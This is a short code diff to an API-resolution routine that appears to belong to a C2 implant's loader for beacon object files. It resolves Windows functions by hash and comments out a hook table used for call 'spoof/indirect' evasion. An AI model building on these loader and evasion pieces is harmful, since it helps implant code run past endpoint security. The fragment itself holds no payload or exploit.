@@ -165,23 +165,13 @@ auto Coff::RslApi(
     //
     // check GetProcAddress, GetModuleHandle or LoadLibrary
     //
-    if ( Hsh::Str( SymName ) == Hsh::Str( "GetProcAddress"   ) ) return (PVOID)Self->Krnl32.GetProcAddress;
-    if ( Hsh::Str( SymName ) == Hsh::Str( "FreeLibrary"      ) ) return (PVOID)Self->Krnl32.FreeLibrary;
-    if ( Hsh::Str( SymName ) == Hsh::Str( "LoadLibraryW"     ) ) return (PVOID)Self->Cf->LoadLibraryW;
-    if ( Hsh::Str( SymName ) == Hsh::Str( "LoadLibraryA"     ) ) return (PVOID)Self->Cf->LoadLibraryA;
-    if ( Hsh::Str( SymName ) == Hsh::Str( "GetModuleHandleA" ) ) return (PVOID)Self->Krnl32.GetModuleHandleA;
-    if ( Hsh::Str( SymName ) == Hsh::Str( "GetModuleHandleW" ) ) return (PVOID)Self->Krnl32.GetModuleHandleW;
-
-    //
-    // if hook bof enabled apply the spoof/indirect
-    //
-    if ( this->HookEnabled ) {
-        for ( INT i = 0; i < sizeof( this->HookTable ); i++ ) {
-            if ( Hsh::Str( SymName ) == this->HookTable[i].Hash ) {
-                return (PVOID)this->HookTable[i].Ptr;
-            }
-        }
-    }
+    if ( Hsh::Str( SymName ) == Hsh::Str( "GetProcAddress"         ) ) return (PVOID)Self->Krnl32.GetProcAddress;
+    if ( Hsh::Str( SymName ) == Hsh::Str( "FreeLibrary"            ) ) return (PVOID)Self->Krnl32.FreeLibrary;
+    if ( Hsh::Str( SymName ) == Hsh::Str( "LoadLibraryW"           ) ) return (PVOID)Self->Cf->LoadLibraryW;
+    if ( Hsh::Str( SymName ) == Hsh::Str( "LoadLibraryA"           ) ) return (PVOID)Self->Cf->LoadLibraryA;
+    if ( Hsh::Str( SymName ) == Hsh::Str( "GetModuleHandleA"       ) ) return (PVOID)Self->Krnl32.GetModuleHandleA;
+    if ( Hsh::Str( SymName ) == Hsh::Str( "GetModuleHandleW"       ) ) return (PVOID)Self->Krnl32.GetModuleHandleW;
+    if ( Hsh::Str( SymName ) == Hsh::Str( "LdrGetProcedureAddress" ) ) return (PVOID)Self->Ntdll.LdrGetProcedureAddress;
 
     //
     // if not beacon api, resolve the windows api
@@ -212,8 +202,16 @@ auto Coff::RslApi(
         LibName = RawBuff;
         FncName = &RawBuff[OffSet+1];
 
-        // Str::ToLowerChar( LibName );
-        // Str::ToLowerChar( FncName );
+        //
+        // if hook bof enabled apply the spoof/indirect
+        //
+        // if ( this->HookEnabled ) {
+        //     for ( INT i = 0; i < 15; i++ ) {
+        //         if ( Hsh::Str( FncName ) == this->HookTable[i].Hash ) {
+        //             return (PVOID)this->HookTable[i].Ptr;
+        //         }
+        //     }
+        // }
 
         INT totalLength = Str::LengthA(LibName) + Str::LengthA(".dll") + 1;
 
